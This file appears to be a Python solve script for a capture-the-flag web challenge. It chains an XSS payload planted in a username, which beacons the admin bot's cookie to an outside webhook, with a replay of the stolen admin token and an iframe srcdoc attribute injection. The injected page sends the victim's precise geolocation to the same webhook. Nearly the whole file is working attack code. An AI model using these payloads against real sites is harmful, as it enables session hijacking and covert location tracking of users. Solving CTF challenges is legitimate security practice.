import sys
sys.path.append('../')

import WebUtils
from WebUtils.HTTPSync import *
from WebUtils.HTTPHost import https_host
from WebUtils.Websocket import SocketIO
from WebUtils.HTTPWebhook import RequestBinWebHook
from WebUtils.HTTPEncodings import encodeURIComponent
from WebUtils.JSCore import he_encode
import re
from time import sleep

WebUtils.setBaseURL("https://chall.polygl0ts.ch:9011")
# WebUtils.setBaseURL("http://localhost:9011")

# res = get("/register")
# token = res.cookies['token']
token = "f99e0135e7fb79d4f42d9f5e309f7b96"
cookies = {
    "token": token
}
print(token)

with RequestBinWebHook('enbit6i3l2ra4') as hook:
    xss = encodeURIComponent("""
    <script>
    navigator.sendBeacon(`""" + hook.url + """`, document.cookie)
    </script>
    """).replace('%20', '').replace('%0A', '')

    leak_token_url = f"http://{xss}:pw@chall.polygl0ts.ch:9009/"

    username_payload = f"""<a href="{leak_token_url}">Click here to play!</a>"""
    post("/updateUser", json={
        "username": username_payload
    }, cookies=cookies)

    res = post('/createChallenge', json={
        "latitude": "1.0",
        "longitude": "1.0",
        "img": "AAAA"
    }, cookies=cookies)

    chalId = res.text.replace("\"", '')

    res = get("/register")
    token = res.cookies['token']
    cookies_clean = {
        "token" : token
    }

    with SocketIO('/') as io:
        _html = get("/", cookies=cookies_clean).text
        username_clean = re.search("<p>Hello (.*?)</p>", _html).group(1)

        get("/bot", params={
            "username": username_clean
        })

        notifications = None
        for event in io.getEventsSync():
            if event[1] == 'auth':
                io.emit('auth', token)
            elif event[0] == 'notifications':
                if notifications is None:
                    notifications = event[1]
                else:
                    if event[1] != notifications:
                        admin_event = [x for x in event[1] if x not in notifications][0]
                        break

    admin_username = admin_event.split(' ')[0]
    print("Got admin username: ", admin_username)
    res = post('/challengeUser', json={
        "username" : admin_username,
        "duelID" : chalId
    }, cookies=cookies)

    for req in hook.getRequestsSync():
        print(req)
        if req['body'].startswith('token='):
            admin_token = req['body'][6:]
            break

    print("Got admin token: ", admin_token)
    cookies = {
        "token" : admin_token
    }

    src_html = """
    <body>
    <script>
    navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('""" + hook.url + """', "latitude: " + d.coords.latitude.toString() + ",longitude: " + d.coords.longitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
    </script>
    </body>
    """

    main_payload_url = https_host(src_html)
    inner_srcdoc = he_encode("""
    <head>
        <meta http-equiv="refresh" content="0; url=""" + main_payload_url + """">
    </head>
    """, {
    'encodeEverything': True
    })
                        
    iframe_inject = """
    " srcdoc='""" + inner_srcdoc + """' allow='geolocation *'
    """.replace('\n', '')

    res = post('/createChallenge', json={
        "latitude": "1.0",
        "longitude": "1.0",
        "img": "AAAA",
        "winText": "asdf",
        "OpenLayersVersion": iframe_inject
    }, cookies=cookies)
    print(res.text)
    chalIdPayload = res.text.replace("\"", '')

    print("Getting new admin for injection")
    with SocketIO('/') as io:
        get("/bot", params={
            "username": admin_username
        })

        notifications = None
        for event in io.getEventsSync():
            print(event)
            if event[1] == 'auth':
                io.emit('auth', admin_token)
            elif event[0] == 'notifications':
                if notifications is None:
                    notifications = event[1]
                else:
                    if event[1] != notifications:
                        admin_event = [x for x in event[1] if x not in notifications][0]
                        break
    
    new_admin_username = admin_event.split(' ')[0]
    print("Got new admin username: ", new_admin_username)

    res = post('/challengeUser', json={
        "username" : new_admin_username,
        "duelID" : chalIdPayload
    }, cookies=cookies)

    for req in hook.getRequestsSync():
        print(req['body'])
        break
